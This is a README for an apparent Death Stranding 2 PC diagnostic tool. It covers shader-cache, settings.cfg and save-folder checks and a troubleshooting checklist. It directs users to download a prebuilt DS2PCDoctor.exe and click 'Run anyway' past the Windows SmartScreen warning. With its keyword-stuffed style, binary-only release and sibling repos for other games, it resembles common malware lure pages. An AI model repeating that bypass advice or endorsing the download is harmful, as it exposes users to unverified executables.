<p align="center">
  <img src="https://i.postimg.cc/KvK4m6DR/banner.png" alt="Death Stranding 2 PC Cache & Save Doctor — Decima Shader, Frame Pacing & Save Checks" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Cache%20%26%20Save%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-ds2--pc--doctor--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Death Stranding 2 PC Cache & Save Doctor — Decima Shader, Frame Pacing & Save Checks

**Death Stranding 2: On the Beach stuttering during vehicle traversal on Windows PC? Experiencing shader compilation freezes or looking for your local save folder before switching upscalers? Inspect your KojimaProductions AppData folder first.**

Death Stranding 2 PC Cache & Save Doctor focuses on Decima Engine's PC behavior on Windows: **compiled shader pipelines, `settings.cfg`, and local save profiles reside inside `%LOCALAPPDATA%\KojimaProductions\DeathStranding2`**.

This project is aimed at **Death Stranding 2: On the Beach on Windows PC (Steam & Epic)**. It concerns `%LOCALAPPDATA%` shader-cache checks, `settings.cfg` backups, Frame Generation pacing diagnostics, and local save protection—not save editing.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Traversal stutter across rough terrain/weather | DX12 shader pipeline compilation or low free space on `C:` | Check `%LOCALAPPDATA%\KojimaProductions\DeathStranding2\ShaderCache` |
| Uneven frame pacing with Frame Generation | Third-party FPS limiter (RTSS) or capture hook conflicting with Decima | Test native vs. DLSS/FSR Frame Generation with overlays closed |
| Black screen after changing HDR / Ultrawide | Invalid display flags written to `settings.cfg` | Back up and reset `%LOCALAPPDATA%\KojimaProductions\DeathStranding2\settings.cfg` |
| Protecting porter saves before NG+ or patches | Cloud sync conflict overwriting local `<SteamID64>\SaveGames` | Create a dated offline backup of `<SteamID64>\SaveGames` |

## Download for Windows

[**Download DS2PCDoctor.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/DS2PCDoctor.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `DS2PCDoctor.exe`? (Automatic checks in ~2 seconds)

- Locates `%LOCALAPPDATA%\KojimaProductions\DeathStranding2` and verifies `settings.cfg` integrity.
- Inspects `ShaderCache` folder health and checks available free space on drive `C:`.
- Finds all `<SteamID64>\SaveGames` folders and prints save slot counts and modification dates.
- Reports GPU driver version and active overlay processes that can affect Decima frame pacing.

### Sample Diagnostic Output

```text
[DS2PCDoctor] Checking KojimaProductions Decima Engine paths...
[OK]   AppData Root     : C:\Users\Player\AppData\Local\KojimaProductions\DeathStranding2
[OK]   settings.cfg     : Found (2.9 KB, writable)
[OK]   ShaderCache      : 412 pipeline files (38.4 GB free on C:)
[OK]   SaveGames        : 76561198041299104\SaveGames (18 checkpoints found)
[WARN] Active Overlay   : RTSS.exe running (may affect Frame Generation pacing)
```

The release ZIP is named `DS2PCDoctor.zip`; the Windows executable inside is named `DS2PCDoctor.exe`.

1. Close Death Stranding 2: On the Beach before moving or checking game files.
2. Click **Download DS2PCDoctor.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `DS2PCDoctor.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Death Stranding 2: On the Beach and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows PC installation of Death Stranding 2: On the Beach, and DirectX 12 compatible GPU drivers.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `DS2PCDoctor.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Traversal stutter when driving across new terrain or weather events

Decima Engine streams high-density terrain assets and compiles DX12 shaders into `%LOCALAPPDATA%`. Low free space on `C:` or stale driver caches trigger brief frame spikes.

### Crash to desktop with Access Violation or DX12 device-removed error

Outdated GPU drivers or conflicting Frame Generation / overlay hooks (RTSS, Discord) can trigger startup or cutscene crashes.

### Corrupted `settings.cfg` after changing Ultrawide or HDR options

Invalid display flags inside `settings.cfg` can cause black screens on launch until backed up and reset.

### Protecting local save profiles before patches or NG+ runs

Copying your `<SteamID>` save folder outside `%LOCALAPPDATA%` protects your porter progression against cloud sync conflicts.

## Where Death Stranding 2: On the Beach files normally belong

On Windows PC, local settings, shader caches, and save profiles live inside `%LOCALAPPDATA%`:

```text
%LOCALAPPDATA%\KojimaProductions\DeathStranding2\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\KojimaProductions\DeathStranding2\
├── settings.cfg
├── ShaderCache\
└── <SteamID64>\
    └── SaveGames\
```

Keep a dated copy of `<SteamID64>\SaveGames` before testing experimental driver releases or graphics config tweaks.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Exit Death Stranding 2 completely.** Confirm `ds2.exe` is no longer running in Task Manager.
2. **Back up `%LOCALAPPDATA%\KojimaProductions\DeathStranding2`.** Copy your `<SteamID64>` save folder and `settings.cfg` to a dated folder in Documents.
3. **Check free space on drive `C:`.** Ensure at least 15 GB of free space on your system drive for Decima shader caches.
4. **Update GPU drivers to the latest 2026 release.** Confirm official driver support for Death Stranding 2: On the Beach PC.
5. **Test native vs. DLSS/FSR Frame Generation with overlays disabled.** Close third-party FPS limiters if uneven frame pacing occurs.
6. **Verify installed files in Steam or Epic Games Launcher.** Repair any corrupted `.bin` archive files.
7. **Restart the game cleanly.** Verify smooth frame pacing and save loading.

### Before moving any files

Never overwrite your `<SteamID64>` save directory during troubleshooting without saving an untouched backup copy first.

## What an effective diagnostic report should tell you

A clear diagnostic check locates **`%LOCALAPPDATA%\KojimaProductions\DeathStranding2`**, inspects `settings.cfg` and `ShaderCache`, checks `C:` free space, and lists local save slots.

## FAQ

**Where are Death Stranding 2 PC save files stored on Windows?**

Inside `%LOCALAPPDATA%\KojimaProductions\DeathStranding2\<SteamID64>\SaveGames\`.

**Where is Death Stranding 2's graphics configuration file located?**

At `%LOCALAPPDATA%\KojimaProductions\DeathStranding2\settings.cfg`.

**Why does the game stutter after updating my NVIDIA or AMD driver?**

Driver updates clear the compiled DirectX 12 shader cache, requiring shaders to rebuild during initial traversal.

**Does this tool edit cargo, likes, or progression?**

No. It strictly inspects local cache, config, and save directories.

**Are any game files or copyrighted assets bundled here?**

No game binaries or save files are included in this repository.

## Useful reading

- [Kojima Productions Official Website](https://www.kojimaproductions.jp/)
- [Death Stranding 2 on Steam](https://store.steampowered.com/search/?term=Death+Stranding+2)

## More Windows Game Diagnostic Tools

- [CrimsonDesert-ShaderFrameDoctor](../CrimsonDesert-ShaderFrameDoctor) — Crimson Desert DX12 shader cache & save diagnostics
- [Marvel1943-ShaderConfigAudit](../Marvel1943-ShaderConfigAudit) — Marvel 1943: Rise of Hydra UE5 shader & VRAM audit
- [Judas-UE5SaveFrameGuard](../Judas-UE5SaveFrameGuard) — Judas UE5 shader compilation & branching save guard
- [GearsEDay-UE5StutterDoctor](../GearsEDay-UE5StutterDoctor) — Gears of War: E-Day UE5 DX12 stutter & config doctor

*Independent community project. Not affiliated with Kojima Productions, Sony Interactive Entertainment, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
 
 
